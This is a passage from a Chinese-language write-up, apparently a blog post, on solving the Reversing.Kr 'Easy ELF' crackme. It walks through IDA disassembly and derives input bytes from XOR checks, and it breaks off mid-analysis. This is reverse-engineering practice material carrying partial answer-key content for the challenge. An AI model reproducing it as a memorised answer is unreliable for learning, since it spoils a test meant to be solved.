&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804851&lt;/span&gt;&lt;span class="nf"&gt;E&lt;/span&gt;                 &lt;span class="no"&gt;and&lt;/span&gt;     &lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="no"&gt;FFFFFFF0h&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048521&lt;/span&gt;                 &lt;span class="nf"&gt;sub&lt;/span&gt;     &lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048524&lt;/span&gt;                 &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt; &lt;span class="c"&gt;; n&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804852&lt;/span&gt;&lt;span class="no"&gt;C&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;offset&lt;/span&gt; &lt;span class="no"&gt;aReversing_krEa&lt;/span&gt; &lt;span class="c"&gt;; &amp;quot;Reversing.Kr Easy ELF\n\n&amp;quot;&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;08048534&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c"&gt;; fd&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804853&lt;/span&gt;&lt;span class="no"&gt;B&lt;/span&gt;                 &lt;span class="no"&gt;call&lt;/span&gt;    &lt;span class="no"&gt;_write&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048540&lt;/span&gt;                 &lt;span class="nf"&gt;call&lt;/span&gt;    &lt;span class="no"&gt;sub_8048434&lt;/span&gt;              &lt;span class="c"&gt;; scanf&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;08048545&lt;/span&gt;                 &lt;span class="no"&gt;call&lt;/span&gt;    &lt;span class="no"&gt;sub_8048451&lt;/span&gt;              &lt;span class="c"&gt;; main algorithm&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804854&lt;/span&gt;&lt;span class="no"&gt;A&lt;/span&gt;                 &lt;span class="no"&gt;cmp&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804854&lt;/span&gt;&lt;span class="nf"&gt;D&lt;/span&gt;                 &lt;span class="no"&gt;jnz&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_804855B&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804854&lt;/span&gt;&lt;span class="nf"&gt;F&lt;/span&gt;                 &lt;span class="no"&gt;call&lt;/span&gt;    &lt;span class="no"&gt;sub_80484F7&lt;/span&gt;              &lt;span class="c"&gt;; correct&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;08048554&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048559&lt;/span&gt;                 &lt;span class="nf"&gt;jmp&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;locret_804857C&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804855&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt; &lt;span class="c"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804855&lt;/span&gt;&lt;span class="no"&gt;B&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804855&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt; &lt;span class="no"&gt;loc_804855B&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                            &lt;span class="c"&gt;; CODE XREF: sub_804851B+32j&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804855&lt;/span&gt;&lt;span class="no"&gt;B&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="c"&gt;; n&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;08048563&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;offset&lt;/span&gt; &lt;span class="no"&gt;aWrong&lt;/span&gt; &lt;span class="c"&gt;; &amp;quot;Wrong\n&amp;quot;&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804856&lt;/span&gt;&lt;span class="no"&gt;B&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c"&gt;; fd&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;08048572&lt;/span&gt;                 &lt;span class="no"&gt;call&lt;/span&gt;    &lt;span class="no"&gt;_write&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048577&lt;/span&gt;                 &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804857&lt;/span&gt;&lt;span class="nf"&gt;C&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804857&lt;/span&gt;&lt;span class="nf"&gt;C&lt;/span&gt; &lt;span class="no"&gt;locret_804857C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                         &lt;span class="c"&gt;; CODE XREF: sub_804851B+3Ej&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804857&lt;/span&gt;&lt;span class="no"&gt;C&lt;/span&gt;                 &lt;span class="no"&gt;leave&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804857&lt;/span&gt;&lt;span class="nf"&gt;D&lt;/span&gt;                 &lt;span class="no"&gt;retn&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804857&lt;/span&gt;&lt;span class="nf"&gt;D&lt;/span&gt; &lt;span class="no"&gt;sub_804851B&lt;/span&gt;     &lt;span class="no"&gt;endp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804857&lt;/span&gt;&lt;span class="nf"&gt;D&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804857&lt;/span&gt;&lt;span class="nf"&gt;D&lt;/span&gt; &lt;span class="c"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;sub_804851B函数是提示正确与错误的分支函数，其中四个call，write识别出来了，其他函数跟进去看一下（我已经注释），发现是scanf、主算法函数和返回Correct字符串的函数，其中当主算法函数返回1时判为正确。&lt;/p&gt;
&lt;p&gt;然后就重点来看sub_8048451。转到图形视图，一组连续判断，只要逻辑沿着右边下来即可走通（最后eax为1，符合上面的判对条件）。&lt;/p&gt;
&lt;p&gt;&lt;img alt="IDA" src="../statics/reversing-kr-4-easy-challenges/2014-09-13_153330.jpg"&gt;&lt;/p&gt;
&lt;p&gt;之后大致扫描了一下程序体，发现反复调用ds段寄存器指向的段内的一些byte，点进去看一下数据区布局（在.bss段，全局变量）。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;.bss:&lt;/span&gt;&lt;span class="err"&gt;0804&lt;/span&gt;&lt;span class="nf"&gt;A020&lt;/span&gt; &lt;span class="no"&gt;byte_804A020&lt;/span&gt;    &lt;span class="no"&gt;db&lt;/span&gt; &lt;span class="err"&gt;?&lt;/span&gt;                    &lt;span class="c"&gt;; DATA XREF: sub_8048434+Bo&lt;/span&gt;
&lt;span class="no"&gt;.bss&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804&lt;/span&gt;&lt;span class="no"&gt;A020&lt;/span&gt;                                         &lt;span class="c"&gt;; sub_8048451:loc_8048469r ...&lt;/span&gt;
&lt;span class="no"&gt;.bss&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804&lt;/span&gt;&lt;span class="no"&gt;A021&lt;/span&gt; &lt;span class="no"&gt;byte_804A021&lt;/span&gt;    &lt;span class="no"&gt;db&lt;/span&gt; &lt;span class="err"&gt;?&lt;/span&gt;                    &lt;span class="c"&gt;; DATA XREF: sub_8048451+3r&lt;/span&gt;
&lt;span class="no"&gt;.bss&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804&lt;/span&gt;&lt;span class="no"&gt;A022&lt;/span&gt; &lt;span class="no"&gt;byte_804A022&lt;/span&gt;    &lt;span class="no"&gt;db&lt;/span&gt; &lt;span class="err"&gt;?&lt;/span&gt;                    &lt;span class="c"&gt;; DATA XREF: sub_8048451+27r&lt;/span&gt;
&lt;span class="no"&gt;.bss&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804&lt;/span&gt;&lt;span class="no"&gt;A022&lt;/span&gt;                                         &lt;span class="c"&gt;; sub_8048451+31w ...&lt;/span&gt;
&lt;span class="no"&gt;.bss&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804&lt;/span&gt;&lt;span class="no"&gt;A023&lt;/span&gt; &lt;span class="no"&gt;byte_804A023&lt;/span&gt;    &lt;span class="no"&gt;db&lt;/span&gt; &lt;span class="err"&gt;?&lt;/span&gt;                    &lt;span class="c"&gt;; DATA XREF: sub_8048451+36r&lt;/span&gt;
&lt;span class="no"&gt;.bss&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804&lt;/span&gt;&lt;span class="no"&gt;A023&lt;/span&gt;                                         &lt;span class="c"&gt;; sub_8048451+40w ...&lt;/span&gt;
&lt;span class="no"&gt;.bss&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804&lt;/span&gt;&lt;span class="no"&gt;A024&lt;/span&gt; &lt;span class="no"&gt;byte_804A024&lt;/span&gt;    &lt;span class="no"&gt;db&lt;/span&gt; &lt;span class="err"&gt;?&lt;/span&gt;                    &lt;span class="c"&gt;; DATA XREF: sub_8048451+45r&lt;/span&gt;
&lt;span class="no"&gt;.bss&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804&lt;/span&gt;&lt;span class="no"&gt;A025&lt;/span&gt; &lt;span class="no"&gt;byte_804A025&lt;/span&gt;    &lt;span class="no"&gt;db&lt;/span&gt; &lt;span class="err"&gt;?&lt;/span&gt;                    &lt;span class="c"&gt;; DATA XREF: sub_8048451:loc_80484A8r&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这段都是被引用数据，且是连续的，各1byte，你可以把它们格式化成数组，我比较懒，就不做这步了。基本可以确认数据区为连续的6个byte，即[20][21][22][23][24][25]。&lt;/p&gt;
&lt;p&gt;下面进行主算法具体逻辑分析：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048451&lt;/span&gt; &lt;span class="nf"&gt;sub_8048451&lt;/span&gt;     &lt;span class="no"&gt;proc&lt;/span&gt; &lt;span class="no"&gt;near&lt;/span&gt;               &lt;span class="c"&gt;; CODE XREF: sub_804851B+2Ap&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;08048451&lt;/span&gt;                 &lt;span class="no"&gt;push&lt;/span&gt;    &lt;span class="no"&gt;ebp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048452&lt;/span&gt;                 &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048454&lt;/span&gt;                 &lt;span class="nf"&gt;movzx&lt;/span&gt;   &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;byte_804A021&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804845&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt;                 &lt;span class="no"&gt;cmp&lt;/span&gt;     &lt;span class="no"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804845&lt;/span&gt;&lt;span class="nf"&gt;D&lt;/span&gt;                 &lt;span class="no"&gt;jz&lt;/span&gt;      &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_8048469&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804845&lt;/span&gt;&lt;span class="nf"&gt;F&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048464&lt;/span&gt;                 &lt;span class="nf"&gt;jmp&lt;/span&gt;     &lt;span class="no"&gt;loc_80484F5&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;第一段确定[21]等于0x31，就是'1'。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048469&lt;/span&gt; &lt;span class="nl"&gt;loc_8048469:&lt;/span&gt;                            &lt;span class="c"&gt;; CODE XREF: sub_8048451+Cj&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048469&lt;/span&gt;                 &lt;span class="nf"&gt;movzx&lt;/span&gt;   &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;byte_804A020&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048470&lt;/span&gt;                 &lt;span class="nf"&gt;xor&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048473&lt;/span&gt;                 &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;byte_804A020&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048478&lt;/span&gt;                 &lt;span class="nf"&gt;movzx&lt;/span&gt;   &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;byte_804A022&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804847&lt;/span&gt;&lt;span class="nf"&gt;F&lt;/span&gt;                 &lt;span class="no"&gt;xor&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048482&lt;/span&gt;                 &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;byte_804A022&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048487&lt;/span&gt;                 &lt;span class="nf"&gt;movzx&lt;/span&gt;   &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;byte_804A023&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804848&lt;/span&gt;&lt;span class="nf"&gt;E&lt;/span&gt;                 &lt;span class="no"&gt;xor&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="no"&gt;FFFFFF88h&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048491&lt;/span&gt;                 &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;byte_804A023&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048496&lt;/span&gt;                 &lt;span class="nf"&gt;movzx&lt;/span&gt;   &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;byte_804A024&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804849&lt;/span&gt;&lt;span class="nf"&gt;D&lt;/span&gt;                 &lt;span class="no"&gt;cmp&lt;/span&gt;     &lt;span class="no"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;58&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804849&lt;/span&gt;&lt;span class="nf"&gt;F&lt;/span&gt;                 &lt;span class="no"&gt;jz&lt;/span&gt;      &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_80484A8&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;A1&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;A6&lt;/span&gt;                 &lt;span class="no"&gt;jmp&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_80484F5&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;第二段做了连续异或，[20] xor 0x34, [22] xor 0x32, [23] xor 0x88, 之后判断[23]是不是为0x58，所以[23]为'X'。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;A8&lt;/span&gt; &lt;span class="no"&gt;loc_80484A8&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                            &lt;span class="c"&gt;; CODE XREF: sub_8048451+4Ej&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;080484&lt;/span&gt;&lt;span class="no"&gt;A8&lt;/span&gt;                 &lt;span class="no"&gt;movzx&lt;/span&gt;   &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;byte_804A025&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;AF&lt;/span&gt;                 &lt;span class="no"&gt;test&lt;/span&gt;    &lt;span class="no"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;B1&lt;/span&gt;                 &lt;span class="no"&gt;jz&lt;/span&gt;      &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_80484BA&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;B3&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;B8&lt;/span&gt;                 &lt;span class="no"&gt;jmp&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_80484F5&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;第三段要求[25]为0，就是'\0'，字符串结尾。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;BA&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;BA&lt;/span&gt; &lt;span class="no"&gt;loc_80484BA&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                            &lt;span class="c"&gt;; CODE XREF: sub_8048451+60j&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;080484&lt;/span&gt;&lt;span class="no"&gt;BA&lt;/span&gt;                 &lt;span class="no"&gt;movzx&lt;/span&gt;   &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;byte_804A022&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;C1&lt;/span&gt;                 &lt;span class="no"&gt;cmp&lt;/span&gt;     &lt;span class="no"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="no"&gt;Ch&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;C3&lt;/span&gt;                 &lt;span class="no"&gt;jz&lt;/span&gt;      &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_80484CC&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;C5&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;CA&lt;/span&gt;                 &lt;span class="no"&gt;jmp&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_80484F5&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;CC&lt;/span&gt; &lt;span class="c"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;080484&lt;/span&gt;&lt;span class="no"&gt;CC&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;CC&lt;/span&gt; &lt;span class="no"&gt;loc_80484CC&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                            &lt;span class="c"&gt;; CODE XREF: sub_8048451+72j&lt;/span&gt;
